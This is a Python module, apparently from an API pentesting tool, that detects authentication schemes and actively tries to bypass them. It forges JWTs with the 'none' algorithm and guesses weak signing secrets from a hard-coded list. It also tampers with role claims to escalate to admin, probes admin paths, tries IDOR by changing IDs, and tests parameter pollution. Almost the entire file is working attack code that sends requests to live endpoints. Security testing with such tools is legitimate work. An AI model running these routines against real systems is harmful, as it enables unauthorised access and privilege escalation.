"""
Authentication detection and bypass techniques for APIs.
"""

import re
from typing import Dict, List, Optional, Any
import requests
import jwt
from jwt import PyJWTError

from .utils import RequestUtils

class AuthDetector:
    """Detect authentication methods used by APIs."""
    
    def __init__(self):
        self.detected_methods = set()
        self.jwt_secrets = []  # Common JWT secrets to test
    
    def detect_auth_methods(self, response: requests.Response) -> List[str]:
        """Detect authentication methods from response."""
        methods = []
        headers = response.headers
        
        # Check WWW-Authenticate header
        if 'WWW-Authenticate' in headers:
            auth_header = headers['WWW-Authenticate'].lower()
            if 'bearer' in auth_header:
                methods.append('Bearer Token')
            if 'basic' in auth_header:
                methods.append('Basic Auth')
            if 'digest' in auth_header:
                methods.append('Digest Auth')
            if 'negotiate' in auth_header:
                methods.append('Negotiate/NTLM')
        
        # Check for custom auth headers
        auth_headers = [h for h in headers.keys() if 'auth' in h.lower() or 'token' in h.lower()]
        for auth_header in auth_headers:
            methods.append(f'Custom Header: {auth_header}')
        
        # Check for cookies that might be auth tokens
        auth_cookies = [c for c in response.cookies if 'session' in c.lower() or 'token' in c.lower()]
        for auth_cookie in auth_cookies:
            methods.append(f'Cookie: {auth_cookie}')
        
        # Check for JWT tokens
        if self._contains_jwt(response):
            methods.append('JWT')
        
        # Check for OAuth parameters
        if self._contains_oauth_params(response):
            methods.append('OAuth')
        
        return list(set(methods))
    
    def _contains_jwt(self, response: requests.Response) -> bool:
        """Check if response contains JWT tokens."""
        # Check headers
        for header_name, header_value in response.headers.items():
            if self._is_jwt(header_value):
                return True
        
        # Check cookies
        for cookie_name, cookie_value in response.cookies.items():
            if self._is_jwt(cookie_value):
                return True
        
        # Check response body
        try:
            response_json = response.json()
            # Recursively check for JWT in JSON response
            if self._find_jwt_in_structure(response_json):
                return True
        except (ValueError, TypeError):
            pass
        
        # Check response text
        if self._find_jwt_in_text(response.text):
            return True
        
        return False
    
    def _is_jwt(self, token: str) -> bool:
        """Check if a string is a JWT token."""
        # JWT pattern: three base64 parts separated by dots
        jwt_pattern = r'^[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]*$'
        return bool(re.match(jwt_pattern, token))
    
    def _find_jwt_in_structure(self, data: Any) -> bool:
        """Recursively search for JWT in data structure."""
        if isinstance(data, dict):
            for key, value in data.items():
                if isinstance(value, str) and self._is_jwt(value):
                    return True
                if self._find_jwt_in_structure(value):
                    return True
        elif isinstance(data, list):
            for item in data:
                if self._find_jwt_in_structure(item):
                    return True
        return False
    
    def _find_jwt_in_text(self, text: str) -> bool:
        """Search for JWT in text."""
        # Look for JWT pattern in text
        jwt_pattern = r'[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]*'
        matches = re.findall(jwt_pattern, text)
        return any(self._is_jwt(match) for match in matches)
    
    def _contains_oauth_params(self, response: requests.Response) -> bool:
        """Check if response contains OAuth parameters."""
        oauth_params = ['access_token', 'refresh_token', 'token_type', 'expires_in', 'scope']
        
        # Check URL parameters
        url = response.url
        if any(param in url for param in oauth_params):
            return True
        
        # Check response body
        try:
            response_json = response.json()
            if isinstance(response_json, dict):
                if any(param in response_json for param in oauth_params):
                    return True
        except (ValueError, TypeError):
            pass
        
        return False
    
    def analyze_jwt(self, token: str) -> Dict[str, Any]:
        """Analyze a JWT token."""
        try:
            # Decode without verification to get payload
            decoded = jwt.decode(token, options={"verify_signature": False})
            header = jwt.get_unverified_header(token)
            
            return {
                'header': header,
                'payload': decoded,
                'algorithm': header.get('alg', 'unknown'),
                'is_valid': self._verify_jwt(token)
            }
        except PyJWTError as e:
            return {'error': str(e)}
    
    def _verify_jwt(self, token: str) -> bool:
        """Try to verify JWT with common secrets."""
        if not self.jwt_secrets:
            self._load_common_jwt_secrets()
        
        header = jwt.get_unverified_header(token)
        algorithm = header.get('alg', 'HS256')
        
        for secret in self.jwt_secrets:
            try:
                jwt.decode(token, secret, algorithms=[algorithm])
                return True
            except PyJWTError:
                continue
        
        return False
    
    def _load_common_jwt_secrets(self) -> None:
        """Load common JWT secrets for testing."""
        self.jwt_secrets = [
            'secret', 'SECRET', 'Secret', 
            'password', 'PASSWORD', 'Password',
            '123456', '123456789', 'qwerty',
            'admin', 'ADMIN', 'Admin',
            'token', 'TOKEN', 'Token',
            'jwt', 'JWT', 
            'key', 'KEY', 'Key',
            'supersecret', 'SUPERSECRET',
            '',  # Empty secret
            None  # No secret
        ]

class AuthBypass:
    """Test authentication bypass techniques."""
    
    def __init__(self):
        self.request_utils = RequestUtils()
        self.bypass_techniques = [
            self._test_none_algorithm,
            self._test_empty_token,
            self._test_tampered_token,
            self._test_admin_privileges,
            self._test_idor,
            self._test_parameter_pollution
        ]
    
    def test_auth_bypass(self, endpoint: str, method: str = "GET", 
                        params: Dict = None, data: Any = None, 
                        headers: Dict = None, auth: Any = None) -> List[Dict[str, Any]]:
        """Test various authentication bypass techniques."""
        results = []
        
        for technique in self.bypass_techniques:
            result = technique(endpoint, method, params, data, headers, auth)
            if result:
                results.append(result)
        
        return results
    
    def _test_none_algorithm(self, endpoint: str, method: str, 
                           params: Dict, data: Any, 
                           headers: Dict, auth: Any) -> Optional[Dict[str, Any]]:
        """Test JWT none algorithm bypass."""
        # Look for JWT in headers
        jwt_tokens = self._extract_jwt_from_headers(headers)
        
        for token in jwt_tokens:
            try:
                # Create a token with none algorithm
                header = jwt.get_unverified_header(token)
                payload = jwt.decode(token, options={"verify_signature": False})
                
                # Create new token with none algorithm
                new_header = header.copy()
                new_header['alg'] = 'none'
                
                none_token = jwt.encode(payload, key='', algorithm='none', headers=new_header)
                
                # Test with none token
                new_headers = headers.copy()
                for key, value in new_headers.items():
                    if self._is_jwt(value):
                        new_headers[key] = none_token
                
                response = self.request_utils.make_request(
                    endpoint, method=method, params=params, 
                    data=data, headers=new_headers, auth=auth
                )
                
                if response and response.status_code < 400:
                    return {
                        'type': 'JWT None Algorithm Bypass',
                        'technique': 'Changed algorithm to "none"',
                        'original_token': token,
                        'modified_token': none_token,
                        'response_status': response.status_code
                    }
            except PyJWTError:
                continue
        
        return None
    
    def _test_empty_token(self, endpoint: str, method: str, 
                         params: Dict, data: Any, 
                         headers: Dict, auth: Any) -> Optional[Dict[str, Any]]:
        """Test with empty or invalid tokens."""
        # Look for auth headers
        auth_headers = {k: v for k, v in headers.items() if 'auth' in k.lower() or 'token' in k.lower()}
        
        for header_name, header_value in auth_headers.items():
            # Test with empty token
            new_headers = headers.copy()
            new_headers[header_name] = ''
            
            response = self.request_utils.make_request(
                endpoint, method=method, params=params, 
                data=data, headers=new_headers, auth=auth
            )
            
            if response and response.status_code < 400:
                return {
                    'type': 'Empty Token Bypass',
                    'technique': 'Used empty token',
                    'header': header_name,
                    'response_status': response.status_code
                }
        
        return None
    
    def _test_tampered_token(self, endpoint: str, method: str, 
                            params: Dict, data: Any, 
                            headers: Dict, auth: Any) -> Optional[Dict[str, Any]]:
        """Test with tampered tokens."""
        # Look for JWT tokens
        jwt_tokens = self._extract_jwt_from_headers(headers)
        
        for token in jwt_tokens:
            try:
                # Decode and tamper with payload
                payload = jwt.decode(token, options={"verify_signature": False})
                
                # Try common privilege escalation tampering
                tamper_keys = ['role', 'admin', 'is_admin', 'user', 'username', 'id']
                for key in tamper_keys:
                    if key in payload:
                        # Save original value
                        original_value = payload[key]
                        
                        # Try different privilege escalation values
                        test_values = ['admin', 'administrator', 'superuser', 'root', 'true', 1]
                        
                        for test_value in test_values:
                            payload[key] = test_value
                            
                            # Re-sign with empty key (might work if signature not verified)
                            tampered_token = jwt.encode(payload, key='', algorithm='HS256')
                            
                            new_headers = headers.copy()
                            for h_key, h_value in new_headers.items():
                                if self._is_jwt(h_value):
                                    new_headers[h_key] = tampered_token
                            
                            response = self.request_utils.make_request(
                                endpoint, method=method, params=params, 
                                data=data, headers=new_headers, auth=auth
                            )
                            
                            if response and response.status_code < 400:
                                return {
                                    'type': 'JWT Tampering Bypass',
                                    'technique': f'Modified {key} to {test_value}',
                                    'original_value': original_value,
                                    'response_status': response.status_code
                                }
            except PyJWTError:
                continue
        
        return None
    
    def _test_admin_privileges(self, endpoint: str, method: str, 
                              params: Dict, data: Any, 
                              headers: Dict, auth: Any) -> Optional[Dict[str, Any]]:
        """Test for admin privilege escalation."""
        # Try common admin paths
        admin_paths = ['/admin', '/administrator', '/manage', '/console', '/api/admin']
        
        parsed_url = requests.utils.urlparse(endpoint)
        base_path = parsed_url.path
        
        for admin_path in admin_paths:
            admin_url = endpoint.replace(base_path, admin_path)
            
            response = self.request_utils.make_request(
                admin_url, method=method, params=params, 
                data=data, headers=headers, auth=auth
            )
            
            if response and response.status_code < 400:
                return {
                    'type': 'Admin Path Access',
                    'technique': f'Accessed admin path: {admin_path}',
                    'url': admin_url,
                    'response_status': response.status_code
                }
        
        return None
    
    def _test_idor(self, endpoint: str, method: str, 
                  params: Dict, data: Any, 
                  headers: Dict, auth: Any) -> Optional[Dict[str, Any]]:
        """Test for Insecure Direct Object Reference."""
        # Look for IDs in URL and parameters
        id_patterns = [r'/\d+', r'/[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}']
        
        for pattern in id_patterns:
            matches = re.findall(pattern, endpoint)
            for match in matches:
                # Try incrementing/decrementing numeric IDs
                if match.isdigit():
                    test_ids = [str(int(match) + 1), str(int(match) - 1), '0', '1']
                    for test_id in test_ids:
                        test_url = endpoint.replace(match, test_id)
                        
                        response = self.request_utils.make_request(
                            test_url, method=method, headers=headers, auth=auth
                        )
                        
                        if response and response.status_code < 400:
                            return {
                                'type': 'IDOR',
                                'technique': f'Changed ID {match} to {test_id}',
                                'original_url': endpoint,
                                'test_url': test_url,
                                'response_status': response.status_code
                            }
        
        return None
    
    def _test_parameter_pollution(self, endpoint: str, method: str, 
                                 params: Dict, data: Any, 
                                 headers: Dict, auth: Any) -> Optional[Dict[str, Any]]:
        """Test for parameter pollution vulnerabilities."""
        if not params:
            return None
        
        # Duplicate parameters with different values
        polluted_params = params.copy()
        for param_name in params.keys():
            polluted_params[param_name] = ['original_value', 'polluted_value']
        
        response = self.request_utils.make_request(
            endpoint, method=method, params=polluted_params, 
            headers=headers, auth=auth
        )
        
        if response and response.status_code < 400:
            return {
                'type': 'Parameter Pollution',
                'technique': 'Duplicated parameters with different values',
                'parameters': list(params.keys()),
                'response_status': response.status_code
            }
        
        return None
    
    def _extract_jwt_from_headers(self, headers: Dict) -> List[str]:
        """Extract JWT tokens from headers."""
        jwt_tokens = []
        
        if not headers:
            return jwt_tokens
        
        for header_value in headers.values():
            if isinstance(header_value, str) and self._is_jwt(header_value):
                jwt_tokens.append(header_value)
        
        return jwt_tokens
    
    def _is_jwt(self, token: str) -> bool:
        """Check if a string is a JWT token."""
        jwt_pattern = r'^[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]*$'
        return bool(re.match(jwt_pattern, token))